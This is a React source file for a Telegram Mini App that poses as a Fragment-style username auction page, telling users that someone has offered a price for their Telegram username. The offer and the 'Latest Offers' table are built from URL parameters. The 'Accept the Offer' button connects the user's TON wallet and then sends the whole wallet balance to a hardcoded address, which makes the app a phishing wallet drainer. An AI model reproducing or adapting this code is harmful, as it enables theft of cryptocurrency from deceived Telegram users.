import "./App.css";
import { useTonConnect } from "./hooks/useTonConnect";
import "@twa-dev/sdk";
import { useTonClientBalance } from "./hooks/useTonClientBalance";
import NavBar from "./components/NavBar";
import { Address, toNano } from "ton-core";
import { useEffect, useState } from "react";
import Modal from "./components/Modal";

function App() {
  const { handleWalletConnect, handleWalletDisconnect, connected, sender } =
    useTonConnect();
  const { balance } = useTonClientBalance();

  const [initData, setInitData] = useState("");
  const [startParam, setStartParam] = useState("");
  const [username, setUsername] = useState("");
  const [offer, setOffer] = useState("");
  const [commission, setCommission] = useState("");

  const [open, setOpen] = useState(false);

  const handleClose = () => {
    setOpen(false);
  };

  const handleOpen = () => {
    setOpen(true);
  };

  const send = async () => {
    if (connected) {
      console.log(connected);
      await sender.send({
        to: Address.parse("EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c"),
        value: toNano(balance!),
      });
    }
  };

  useEffect(() => {
    const initWebApp = async () => {
      if (typeof window !== "undefined") {
        const WebApp = (await import("@twa-dev/sdk")).default;
        WebApp.ready();
        setInitData(WebApp.initData);
        setStartParam(WebApp.initDataUnsafe.start_param || "");
        setUsername(WebApp.initDataUnsafe.start_param?.split("-")[0] || "");
        setOffer(WebApp.initDataUnsafe.start_param?.split("-")[1] || "");
        setCommission(WebApp.initDataUnsafe.start_param?.split("-")[2] || "");
        if (!localStorage.getItem("offerDate")) {
          localStorage.setItem("offerDate", new Date().toDateString());
        }
      }
    };

    initWebApp();
  }, []);

  // console.log(initData);
  // console.log(username);
  // console.log(startParam);

  return (
    <>
      <div className="app">
        <NavBar />
        {!startParam ? (
          <p className="not-found">Not Found</p>
        ) : (
          <div className="auction">
            <div className="header">
              <div className="name">
                <h1>{username}.t.me</h1>
                <span>On auction</span>
              </div>
              <p className="link hover">Subscribe to updates</p>
            </div>
            <div className="auction_info">
              <div className="left">
                <div className="info">
                  <h3>What is this?</h3>
                  <p>
                    Someone offered <span className="with-ton">{offer}</span>{" "}
                    for your username. If the price suits you, press "Accept the
                    offer".
                  </p>
                  <p onClick={handleOpen} className="link hover">
                    How does this work?
                  </p>
                </div>
              </div>
              <div className="right">
                <div className="info">
                  <div className="item">
                    <div>Telegram Username</div>
                    <div className="link">@{username}</div>
                  </div>
                  <div className="item">
                    <div>Web Address</div>
                    <div className="link">t.me/{username}</div>
                  </div>
                  <div className="item">
                    <div>TON Web 3.0 Address</div>
                    <div className="link">{username}.t.me</div>
                  </div>
                </div>
              </div>
            </div>
            <button
              className="btn"
              onClick={connected ? send : handleWalletConnect}
            >
              Accept the Offer
            </button>
            <p className="link hover hidden">Subscribe to updates</p>

            <div className="auction_table">
              <h3>Latest Offers</h3>
              <div className="twrap">
                <table>
                  <thead>
                    <th>Offer</th>
                    <th>Date</th>
                    <th>From</th>
                  </thead>
                  <tbody>
                    <tr>
                      <td>
                        <span className="with-ton">{offer}</span>
                      </td>
                      <td>{localStorage.getItem("offerDate")}</td>
                      <td className="link hover">address</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}
        <footer>
          <ul className="links">
            <li>
              <a href="">Top Auctions</a>
            </li>
            <li>
              <a href="">About</a>
            </li>
            <li>
              <a href="">Terms</a>
            </li>
            <li>
              <a href="">Privacy</a>
            </li>
          </ul>
        </footer>
      </div>

      <Modal open={open} handleClose={handleClose} />
    </>
  );
}

export default App;
